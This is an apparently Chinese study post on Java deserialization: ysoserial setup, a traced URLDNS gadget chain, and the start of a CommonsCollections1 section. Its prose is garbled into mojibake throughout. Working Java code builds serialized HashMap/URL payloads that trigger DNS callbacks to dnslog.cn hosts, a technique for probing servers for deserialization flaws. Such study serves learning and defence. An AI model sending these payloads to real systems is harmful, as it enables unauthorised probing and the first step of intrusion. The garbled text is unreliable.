        <content type="html"><![CDATA[<p>å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸¤ç¯‡åˆ†æjavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ‰§è¡Œæµç¨‹ã€‚</p><p><a href="https://www.cnpanda.net/sec/893.html">https://www.cnpanda.net/sec/893.html</a></p><p><a href="https://www.cnpanda.net/sec/928.html">https://www.cnpanda.net/sec/928.html</a></p><p>æ­å»ºä»æ–°å¤ä¹ ä»¥å‰å­¦è¿‡çš„javaååºåˆ—åŒ–ï¼Œå°½é‡èƒ½å¤Ÿéƒ½è·Ÿä¸€éä»¥å‰ä¸å¤Ÿç»†è‡´å¤ªè¿‡äºæµ®èºï¼Œå› æ­¤é‡æ–°å¼€å¯ä¸€ä¸ªæ–°çš„å­¦ä¹ ã€‚</p><h2 id="1-ç¯å¢ƒæ­å»º"><a href="#1-ç¯å¢ƒæ­å»º" class="headerlink" title="1.ç¯å¢ƒæ­å»º"></a>1.ç¯å¢ƒæ­å»º</h2><p>åœ¨è¿›è¡Œååºåˆ—åŒ–è°ƒè¯•æ—¶æˆ‘ä»¬å…ˆ<a href="https://github.com/frohoff/ysoserial">ysoserial</a>é¡¹ç›®è¿›è¡Œç¯å¢ƒæ­å»ºï¼Œä¸‹é¢å°±æ­å»ºé‡åˆ°çš„é—®é¢˜åšä¸€ä¸ªè®°å½•ã€‚</p><p>é¦–å…ˆç›´æ¥ä¸‹è½½å‹ç¼©åŒ…ç„¶åå°†é¡¹ç›®æ‹–è¿›ideaï¼Œä¹‹åå°†pom.xmæ–‡ä»¶ä¸­çš„ä¾èµ–jarå…¨éƒ¨ä¸‹è½½ã€‚</p><h3 id="ç¬¬ä¸€ä¸ªé—®é¢˜"><a href="#ç¬¬ä¸€ä¸ªé—®é¢˜" class="headerlink" title="ç¬¬ä¸€ä¸ªé—®é¢˜"></a>ç¬¬ä¸€ä¸ªé—®é¢˜</h3><p>å°±æ˜¯ä¾èµ–åŒ…æœ‰çš„åŠ è½½ä¸å‡ºæ¥å¯èƒ½æ˜¯å› ä¸ºæˆ‘ä»¬é…ç½®çš„é˜¿é‡Œäº‘çš„é•œåƒæ²¡æœ‰ä¾èµ–çš„åŸå› æ‰€ä»¥æˆ‘ä»¬å°±æ‰‹åŠ¨å°†jarå¯¼å…¥åˆ°æœ¬åœ°mavenä»“åº“ã€‚è¿™é‡Œå‚è€ƒ<a href="https://blog.csdn.net/Ming_super/article/details/128728472">https://blog.csdn.net/Ming_super&#x2F;article&#x2F;details&#x2F;128728472</a>è¿›è¡Œå¯¼å…¥</p><p>é¦–å…ˆæ‰¾åˆ°mavençš„å®˜ç½‘ç„¶åæ‰¾åˆ°è‡ªå·±æ‰€éœ€è¦çš„ä¾èµ–</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846520144-c8a0632e-a6d5-4cdd-9bc9-1751ec77ce83.png"></p><p>å°†çº¢ç®­å¤´æ‰€æŒ‡çš„jaråŒ…ä¸‹è½½ä¸‹æ¥ã€‚ç„¶åæ‰“å¼€windows cmd  å°†jaråŒ…å¯¼å…¥åˆ°æœ¬åœ°ä»“åº“ã€‚</p><p>è¾“å…¥ä»¥ä¸‹å‘½ä»¤ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file</span><br><span class="line">        -Dfile=D:\mybatis-<span class="number">3.5</span><span class="number">.10</span>.jar</span><br><span class="line">        -DgroupId=org.mybatis</span><br><span class="line">        -DartifactId=mybatis </span><br><span class="line">        -Dversion=<span class="number">3.5</span><span class="number">.10</span> </span><br><span class="line">        -Dpackaging=jar</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±å¯ä»¥åœ¨pom.xmlæ–‡ä»¶ä¸­æ­£å¸¸åŠ è½½äº†ã€‚</p><h3 id="ç¬¬äºŒä¸ªé—®é¢˜"><a href="#ç¬¬äºŒä¸ªé—®é¢˜" class="headerlink" title="ç¬¬äºŒä¸ªé—®é¢˜"></a>ç¬¬äºŒä¸ªé—®é¢˜</h3><p>å°±æ˜¯æˆ‘ä»¬åœ¨è¿è¡Œysoserialä¸»ç¨‹åºä¸€ç›´æŠ¥é”™æ‰¾ä¸åˆ°javaç¨‹åºåŒ…ï¼Œä½†æ˜¯é€šè¿‡æ’æŸ¥å‘ç°æ˜æ˜å·²ç»å¯¼å…¥è¿›æ¥äº†ã€‚</p><p>è¿™é‡Œè§£å†³åŠæ³•ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846707666-96b1ee34-0ec7-481f-b70a-d432a380655c.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846755542-a2acd9be-7a79-4fb2-97a2-71d75842c4b6.png"></p><p>æ‰“å¼€ideaé¡¹ç›®ä¸­çš„Project Structure å°†ç®­å¤´æ‰€æŒ‡çš„åœ°æ–¹æ”¹æˆç›¸å¯¹åº”çš„ç„¶ååœ¨settingä¸­å°†æœ¬åœ°çš„javaç¯å¢ƒä¸é¡¹ç›®ç¯å¢ƒä¹Ÿè®¾ç½®åŸåŒæ ·çš„<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846810061-f2252040-e8c1-42ab-ad29-a2c1b44e0157.png"></p><p>ä¹‹åå°±å¯ä»¥è¿è¡Œç¨‹åºäº†ã€‚</p><p>åœ¨è¿è¡Œç¨‹åºè¾“å…¥å‚æ•°å¯ä»¥ç›´æ¥åœ¨é¡¹ç›®ä¸­è¿›è¡Œç¼–è¾‘</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846852331-f630cc9f-ddb0-404f-af84-0bbcc0adef30.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846884585-98d25eba-5449-40d9-8558-3836b9e20673.png"></p><p>è¿™é‡Œä»¥ç”Ÿæˆurldnsé“¾ä¸ºä¾‹å…¶å®ƒçš„å¯ä»¥è‡ªè¡Œç™¾åº¦ã€‚</p><h2 id="javaååºåˆ—åŒ–çš„è¿‡ç¨‹"><a href="#javaååºåˆ—åŒ–çš„è¿‡ç¨‹" class="headerlink" title="javaååºåˆ—åŒ–çš„è¿‡ç¨‹"></a>javaååºåˆ—åŒ–çš„è¿‡ç¨‹</h2><p>å‚è€ƒï¼š<a href="https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/">https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724413722961-dd6cbb05-5809-4b6a-9ae9-22f63f62cc7f.png"></p><h2 id="è°ƒç”¨å›¾ï¼š"><a href="#è°ƒç”¨å›¾ï¼š" class="headerlink" title="è°ƒç”¨å›¾ï¼š"></a>è°ƒç”¨å›¾ï¼š</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724417545879-786e96dc-7106-451a-a127-11550f04b107.png"></p><h2 id="2-URLDNSé“¾"><a href="#2-URLDNSé“¾" class="headerlink" title="2.URLDNSé“¾"></a>2.URLDNSé“¾</h2><p>URLDNS å°±æ˜¯ysoserialä¸­â¼€ä¸ªåˆ©â½¤é“¾çš„åå­—ï¼Œä½†å‡†ç¡®æ¥è¯´ï¼Œè¿™ä¸ªå…¶å®ä¸èƒ½ç§°ä½œâ€œåˆ©â½¤é“¾â€ã€‚å› ä¸ºå…¶å‚æ•°ä¸ </p><p>æ˜¯â¼€ä¸ªå¯ä»¥â€œåˆ©â½¤â€çš„å‘½ä»¤ï¼Œâ½½ä»…ä¸ºâ¼€ä¸ªURLï¼Œå…¶èƒ½è§¦å‘çš„ç»“æœä¹Ÿä¸æ˜¯å‘½ä»¤æ‰§â¾ï¼Œâ½½æ˜¯â¼€æ¬¡DNSè¯·æ±‚ã€‚ </p><p>è™½ç„¶è¿™ä¸ªâ€œåˆ©â½¤é“¾â€å®é™…ä¸Šæ˜¯ä¸èƒ½â€œåˆ©â½¤â€çš„ï¼Œä½†å› ä¸ºå…¶å¦‚ä¸‹çš„ä¼˜ç‚¹ï¼Œâ¾®å¸¸é€‚åˆæˆ‘ä»¬åœ¨æ£€æµ‹ååºåˆ—åŒ–æ¼æ´æ—¶ä½¿â½¤ï¼š </p><p>ä½¿â½¤Javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰â½…åº“æ²¡æœ‰ä¾èµ– </p><p>åœ¨â½¬æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</p><p>ysoserialå¦‚ä½•ç”Ÿæˆurldnsé“¾çš„è¿‡ç¨‹å¯ä»¥å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/gk0d/p/16874157.html">https://www.cnblogs.com/gk0d/p/16874157.html</a></p><h3 id="è°ƒç”¨è¿‡ç¨‹ï¼š"><a href="#è°ƒç”¨è¿‡ç¨‹ï¼š" class="headerlink" title="è°ƒç”¨è¿‡ç¨‹ï¼š"></a>è°ƒç”¨è¿‡ç¨‹ï¼š</h3><p>é¦–å…ˆåˆ¤æ®µæ˜¯å¦ä¼ å…¥äº†ä¸¤ä¸ªå‚æ•°ï¼Œå¦‚æœä¸æ˜¯åˆ™æ‰“å°å¸®åŠ©ä¿¡æ¯ï¼›æ˜¯çš„è¯ä¼šä¾æ¬¡åˆ†åˆ«èµ‹å€¼ç»™payloadTypeå’Œcommandå˜é‡ã€‚<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224687545-3edda390-9a0c-45d9-8a0c-4c684dbbd91c.png"></p><p>ä¹‹åå®ä¾‹åŒ–äº†ä¸€ä¸ªéœ€è¦ç»§æ‰¿ObjectPayloadç±»çš„ç±»å®ä¾‹åŒ–å¯¹è±¡ï¼Œè·Ÿè¿›ä¸€ä¸‹getPayloadClassæ–¹æ³•ï¼Œåœ¨ysoserial.payloads.ObjectPayload.Utilsä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224728921-ed2aa8ef-b5cc-4370-8fbb-6a7e6f62a6a6.png"></p><p>åœ¨ç®­å¤´æ‰€æŒ‡çš„åœ°æ–¹é€šè¿‡åå°„è·å–äº† URLDNSçš„classå¯¹è±¡ï¼Œç„¶åå®ä¾‹åŒ–è·å–URLDNSå¯¹è±¡å¹¶è°ƒç”¨ getobjectæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224856548-2df67463-1926-4d9f-a13b-df89d995aa2e.png"></p><p>é€šè¿‡è·Ÿè¿›getobjectæ–¹æ³•å‘ç°å…¶è¿”å›äº†ä¸€ä¸ªhashmapå¯¹è±¡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224908824-b3a13ef8-9953-4045-93f6-7e809ff94bd5.png"></p><p>ç„¶ååºåˆ—åŒ–è¾“å‡ºè¯¥å¯¹è±¡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224970963-b7bcbbb8-34e1-41c2-a6f3-ea5fb0ba0b0f.png"></p><p>ä»¥ä¸Šå°±æ˜¯ysoserialç”Ÿæˆurldnsçš„è¿‡ç¨‹ï¼Œä¸‹é¢ç€é‡åˆ†æä»¥ä¸‹ä¸ºä»€ä¹ˆååºåˆ—åŒ–å¯ä»¥è§¦å‘ä¸€æ¬¡dnsè¯·æ±‚ã€‚ä¸Šæ–‡å·²ç»è¯´åˆ°äº†æœ€ååºåˆ—åŒ–çš„æ˜¯hashmapå¯¹è±¡æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹hashmapçš„readobjectæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\shentougongju\\ysoserial\\test.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> o.readObject();</span><br><span class="line">        System.out.println(o1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨hashmapçš„readobjectä¸­ä¸‹ä¸€ä¸ªæ–­ç‚¹è¿›è¡Œè°ƒè¯•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714226809705-1373e80c-42da-43cb-96bf-f6e194c1f1b9.png"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°æœ€ç»ˆè°ƒç”¨äº†ä¸€ä¸ªputvalæ–¹æ³•ï¼Œå®ƒé‡Œé¢å¯¹keyè¿›è¡Œäº†hashæ–¹æ³•ï¼Œè€Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªkeyæ˜¯æˆ‘ä»¬åºåˆ—åŒ–è¿›å»çš„URLå¯¹è±¡ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714226956902-caa74e7f-b275-4ed1-9462-7a9fe21ae4a6.png"></p><p>å‘ç°å¯¹keyåšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœä¸ä¸ºç©ºçš„è¯å°±è°ƒç”¨keyå¯¹è±¡çš„hashcodeæ–¹æ³•ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬çŸ¥é“keyæ˜¯urlå¯¹è±¡ï¼Œæ‰€ä»¥è°ƒç”¨çš„æ˜¯URLå¯¹è±¡çš„hashcodeæ–¹æ³•ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227099512-fcb456ae-9394-47eb-af59-b2fc6a283f27.png"></p><p>è¿™é‡Œåˆ¤æ–­hashcodeæ˜¯å¦ç­‰äº-1å¦‚æœä¸ç­‰äº-1å°±è¿”å›hashcodeå¦‚æœç­‰äº-1å°±ç»§ç»­è°ƒç”¨handlerçš„hashcodeæ–¹æ³•ï¼Œè¿™é‡Œé€šè¿‡ä¸Šæ–‡çš„getobjectæ–¹æ³•å¯ä»¥çŸ¥é“ä¼ å…¥çš„handleræ˜¯URLStreamHandlerå¯¹è±¡ç»§ç»­è·Ÿè¿›å»ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227369926-1b0616ed-65b5-447d-8f1e-85f1b6a3fce8.png"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬10è¡Œè°ƒç”¨äº†getHostAddressæ–¹æ³•è·Ÿè¿›å»çœ‹çœ‹ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227492916-5798e9bc-3026-41fd-82ce-2d24029e79c8.png"></p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227509620-598dd861-441a-4615-90fc-d14bf1509353.png"></p><p>å‘ç°è°ƒç”¨getBynameæ–¹æ³• è¿™â¾¥ InetAddress.getByName(host) çš„ä½œâ½¤æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€ï¼Œåœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNSæŸ¥è¯¢ã€‚</p><p>è¿™é‡Œæ˜¯ysoserialçš„payloadæ€»ç»“ä¸€ä¸‹è°ƒç”¨é“¾</p><ol><li>HashMap-&gt;readObject()</li><li>PutVal-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ç½‘ä¸Šå¸¸è§çš„payloadä¸ysoserialçš„åŒºåˆ«</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://7gjq24.dnslog.cn&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">       f.setAccessible(<span class="literal">true</span>); <span class="comment">// ç»•è¿‡Javaè¯­è¨€æƒé™æ§åˆ¶æ£€æŸ¥çš„æƒé™</span></span><br><span class="line">       f.set(url,<span class="number">123</span>); <span class="comment">// è®¾ç½®hashcodeçš„å€¼ä¸º-1çš„å…¶ä»–ä»»ä½•æ•°å­—</span></span><br><span class="line">       System.out.println(url.hashCode());</span><br><span class="line">       map.put(url,<span class="number">123</span>); <span class="comment">// è°ƒç”¨HashMapå¯¹è±¡ä¸­çš„putæ–¹æ³•ï¼Œæ­¤æ—¶å› ä¸ºhashcodeä¸ä¸º-1ï¼Œä¸å†è§¦å‘dnsæŸ¥è¯¢</span></span><br><span class="line">       f.set(url,-<span class="number">1</span>); <span class="comment">// å°†hashcodeé‡æ–°è®¾ç½®ä¸º-1ï¼Œç¡®ä¿åœ¨ååºåˆ—åŒ–æˆåŠŸè§¦å‘</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">           <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line"></span><br><span class="line">           outputStream.writeObject(map);</span><br><span class="line">           outputStream.close();</span><br><span class="line">           fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">           <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">           inputStream.readObject();</span><br><span class="line">           inputStream.close();</span><br><span class="line">           fileInputStream.close();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨è¿›è¡Œputä¹‹å‰URLå¯¹è±¡ä¹‹å‰æˆ‘ä»¬åå°„ä¿®æ”¹äº†å…¶hashcodeçš„å€¼ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Œæ˜¯å› ä¸ºåœ¨åºåˆ—åŒ–çš„æ—¶å€™writeobject ä¼šå†™å…¥key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">buckets</span> <span class="operator">=</span> capacity();</span><br><span class="line">        <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeInt(buckets);</span><br><span class="line">        s.writeInt(size);</span><br><span class="line">        internalWriteEntries(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">internalWriteEntries</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      Node&lt;K,V&gt;[] tab;</span><br><span class="line">      <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">              <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                  s.writeObject(e.key);</span><br><span class="line">                  s.writeObject(e.value);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡Œçš„keyä»¥åŠvalueæ˜¯ä»tabä¸­å–çš„ï¼Œè€Œtabçš„å€¼å³HashMapä¸­tableçš„å€¼ã€‚æ­¤æ—¶æˆ‘ä»¬å¦‚æœæƒ³è¦ä¿®æ”¹tableçš„å€¼ï¼Œå°±éœ€è¦è°ƒç”¨HashMap#putæ–¹æ³•ï¼Œè€ŒHashMap#putæ–¹æ³•ä¸­ä¹Ÿä¼šå¯¹keyè°ƒç”¨ä¸€æ¬¡hashæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå°±ä¼šäº§ç”Ÿç¬¬ä¸€æ¬¡dnsæŸ¥è¯¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNStest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://razgbd.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">//æ­¤æ—¶ä¼šäº§ç”ŸdnsæŸ¥è¯¢</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¦æƒ³ä¸åœ¨putçš„æ—¶å€™å‘èµ·dnsè¯·æ±‚éœ€è¦åå°„ä¿®æ”¹å…¶hashcodeçš„å€¼è®©å…¶ä¸ä¸º-1å³å¯å› ä¸ºä¸ä¸º-1ä¼šç›´æ¥è¿”å›hashcodeçš„å€¼ä¸ä¼šè¿›è¡Œåç»­çš„è°ƒç”¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714232350597-a9d56e20-f65f-424e-98f4-2d6a0a232f99.png"></p><p>é‚£ysoserialåœ¨putæ—¶æ˜¯æ€ä¹ˆä¸è§¦å‘dnsè¯·æ±‚çš„å‘¢è°ƒè¯•ä¸€ä¸‹ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235280291-9d23edfb-4a62-48ec-b317-73c2783170c9.png"></p><p>åœ¨è°ƒç”¨åˆ°ç®­å¤´æ‰€æŒ‡å‘çš„æ–¹æ³•æ—¶å…¶è¿”å›ä¸€ä¸ªnullå€¼ï¼Œä»è€Œä¸è§¦å‘dnsè¯·æ±‚<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235322122-f98710a8-b5f4-4c17-bb18-8335d5bc7b9e.png"></p><p>é‚£ä¸ºä»€ä¹ˆååºåˆ—åŒ–æ—¶åˆèƒ½å¤Ÿå‘èµ·è¯·æ±‚äº†å‘¢æ˜¯å› ä¸ºURLç±»ä¸­handlerè¢«è®¾ç½®ä¸º transientï¼ˆå½“ä¸€ä¸ªå­—æ®µè¢«å£°æ˜ä¸º transient æ—¶ï¼Œè¡¨ç¤ºè¯¥å­—æ®µä¸ä¼šå‚ä¸å¯¹è±¡çš„åºåˆ—åŒ–è¿‡ç¨‹ï¼Œå³åœ¨å°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµä»¥ä¾¿è¿›è¡Œå­˜å‚¨æˆ–ä¼ è¾“æ—¶ï¼Œè¿™äº›å­—æ®µçš„å€¼ä¸ä¼šè¢«åŒ…å«åœ¨åºåˆ—åŒ–çš„ç»“æœä¸­ã€‚ï¼‰<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235649137-224edc64-5083-4337-839c-86b8ceaf2395.png"></p><p>æ‰€ä»¥ååºåˆ—åŒ–å¯ä»¥è§¦å‘dnsè¯·æ±‚</p><p>å‚è€ƒï¼š<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631738506-bbe121c1-93dc-46af-bbf1-f404742d8cf6.pdf">Javaå®‰å…¨æ¼«è°ˆ - 09.ååºåˆ—åŒ–ç¯‡(3).pdf</a></p><h2 id="3-java-cc1é“¾-TranformedMap"><a href="#3-java-cc1é“¾-TranformedMap" class="headerlink" title="3.java cc1é“¾-TranformedMap"></a>3.java cc1é“¾-TranformedMap</h2><p>å¤ä¹ ä¸€éä¹‹å‰å­¦è¿‡çš„ï¼Œç”±äºå¤ªè¿‡ä¹…è¿œå¯¼è‡´åŸºæœ¬å…¨éƒ¨å¿˜è®°äº†ï¼Œè¿˜æœ‰å°±æ˜¯å½“æ—¶çš„ç¬”è®°è®°å¾—å¤ªè¿‡äºæ½¦è‰å¯¼è‡´æ ¹æœ¬æ²¡æ³•å¤ä¹ ã€‚</p><p>è¿™æ¬¡é‡æ–°è·Ÿä¸€écc1é“¾ã€‚</p><h3 id="3-1ç¯å¢ƒæ­å»º"><a href="#3-1ç¯å¢ƒæ­å»º" class="headerlink" 